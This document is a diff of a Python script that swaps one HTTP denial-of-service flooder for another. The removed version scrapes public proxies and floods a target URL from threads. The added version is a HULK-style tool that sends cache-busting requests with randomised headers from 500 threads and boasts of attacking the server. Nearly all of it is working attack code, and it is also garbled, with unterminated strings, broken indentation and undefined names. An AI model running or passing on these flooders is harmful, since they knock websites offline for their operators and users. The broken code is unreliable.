@@ -1,115 +1,144 @@
 ‎#!/usr/bin/python3
 ‎# -*- coding: utf-8 -*-
 ‎import os
-‎import time
-‎import socket
-‎import getpass
-‎import requests as r, os, threading, random, click, fake_headers
-‎from threading import Thread
-‎from fake_headers import Headers
-‎os.system("clear")
+import urllib2
+import sys
+import threading
+import random
+import re
 
-# Colors
-class bcolors:
-    KUN = '\033[95m'
-    FAYAKUN = "\033[37m"
+#global params
+url=''
+host=''
+headers_useragents=[]
+headers_referers=[]
+request_counter=0
+flag=0
+safe=0
 
-attemps = 0
-os.system("clear")
-print("""
-\033[37m
-╔═════╗╔════╗
-‎║▒╔══╗▒╔══╗▒║        
-‎║▒║   ║▒║  ║▒║╔═╗   
-‎║▒║   ║▒║  ║▒║║▒║
-‎║▒║   ║▒║  ║▒║║▒║  
-║▒║   ║▒╚══║▒║╝▒║  
-║▒║   ╚════║▒║║▒║          
-╚═╝    ╔═╗ ╚═╝║▒║
-        ║▒╚════╝▒║
-        ╚════════╝
-‎\033[96m╔════════════════════════════════════════════════╗
-‎\033[96m║\033[34m BRIGADE ATTACKER SNIPER ELITE \033[96m║
-‎\033[96m║\033[33m INTERNAL SCRIPT \033[96m║
-‎\033[96m║\033[32m By: KF'99 \033[96m║
-‎\033[96m║\033[95m ——o0o—— \033[96m║
-‎\033[96m╚════════════════════════════════════════════════
-‎""")
-‎‎# Password authentication function
-def authenticate():
-    ‎password = "BASe" # The password to access the tool
-    ‎user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
-‎
-   if user_password != password:
-       ‎print("\033[1;31mIncorrect password. Exiting...\033[0m")
-       attemps += 1
-       ‎exit()
-‎
-def check_prox(array, url):
-‎	ip = r.post("http://ip.beget.ru/").text
-‎	for prox in array:
-‎		thread_list = []
-‎		t = threading.Thread (target=check, args=(ip, prox, url))
-‎		thread_list.append(t)
-‎		t.start()
-‎
-def check(ip, prox, url):
-‎	try:
-‎		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
-‎	except:
-‎		ipx = ip
-‎	if ip != ipx:
-‎		thread_list = []
-‎		t = threading.Thread (target=ddos, args=(prox, url))
-‎		thread_list.append(t)
-‎		t.start()
-‎
-def ddos(prox, url):
-‎	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
-‎	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
-‎	color = random.choice(colors)
-‎	while True:
-‎		headers = Headers(headers=True).generate()
-‎		thread_list = []
-‎		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
-‎		thread_list.append(t)
-‎		t.start()
-‎
-def start_ddos(prox, url, headers, proxies, color):
-‎	try:
-‎		s = r.Session()
-‎		req = s.get(url, headers=headers, proxies=proxies)
-‎		if req.status_code == 200:
-‎			print(color+"{}_proxy ".format(prox))
-‎	except:
-‎		pass
-‎
-‎@click.command()
-‎@click.option('--proxy', '-p', help="File with a proxy")
-‎@click.option('--url', '-u', help="URL")
-‎def main(proxy, url):
-‎	clear()
-‎	logo()
-‎	if url == None:
-‎		url = input("URL: ")
-‎	if url[:4] != "http":
-‎		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
-‎		exit()
-‎	if proxy == None:
-‎		while True:
-‎			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
-‎			array = req.text.split()
-‎			print(Back.YELLOW+Fore.WHITE+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
-‎			check_prox(array, url)
-‎	else:
-‎		try:
-‎			fx = open(proxy)
-‎			array = fx.read().split()
-‎			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
-‎			check_prox(array, url)
-‎		except FileNotFoundError:
-‎			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
-‎			exit()
-‎
-‎main()
-‎
+def inc_counter():
+	global request_counter
+	request_counter+=1
+
+def set_flag(val):
+	global flag
+	flag=val
+
+def set_safe():
+	global safe
+	safe=1
+	
+
+def useragent_list():
+	global headers_useragents
+	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+	return(headers_useragents)
+
+# generates a referer array
+def referer_list():
+	global headers_referers
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://' + host + '/')
+	return(headers_referers)
+	
+
+def buildblock(size):
+	out_str = ''
+	for i in range(0, size):
+		a = random.randint(95, 165)
+		out_str += chr(a)
+	return(out_str)
+
+def usage():
+	
+	print"
+
+#http request
+def httpcall(url):
+	useragent_list()
+	referer_list()
+	code=0
+	if url.count("?")>0:
+		param_joiner="&"
+	else:
+		param_joiner="?"
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request.add_header('User-Agent', random.choice(headers_useragents))
+	request.add_header('Cache-Control', 'no-cache')
+	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
+	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Connection', 'keep-alive')
+	request.add_header('Host',host)
+	try:
+			urllib2.urlopen(request)
+	except urllib2.HTTPError, e:
+			#print e.code
+			set_flag(1)
+			print("")
+			code=500
+	except urllib2.URLError, e:
+			#print e.reason
+			sys.exit()
+	else:
+			inc_counter()
+			urllib2.urlopen(request)
+	return(code)		
+
+	
+#http caller thread 
+class HTTPThread(threading.Thread):
+	def run(self):
+		try:
+			while flag<2:
+				code=httpcall(url)
+				if (code==500) & (safe==1):
+					set_flag(2)
+		except Exception, ex:
+			pass
+
+class MonitorThread(threading.Thread):
+	def run(self):
+		previous=request_counter
+		while flag==0:
+			if (previous+500<request_counter) & (previous<>request_counter):
+				print "%d D1MOD ATTACKED THE SERVER -->" % (request_counter)
+				previous=request_counter
+		if flag==2:
+			print "\n-- D1MOD Attack Finished --"
+
+
+if len(sys.argv) < 2:
+	usage()
+	sys.exit()
+else:
+	if sys.argv[1]=="help":
+		usage()
+		sys.exit()
+	else:
+		print "_<-- D1MOD ATTACK STARTED --->"
+			if sys.argv[2]=="safe":
+				set_safe()
+		url = sys.argv[1]
+		if url.count("/")==2:
+			url = url + "/"
+		m = re.search('(https?\://)?([^/]*)/?.*', url)
+		host = m.group(2)
+		for i in range(500):
+			t = HTTPThread()
+			t.start()
+		t = MonitorThread()
+		t.start()
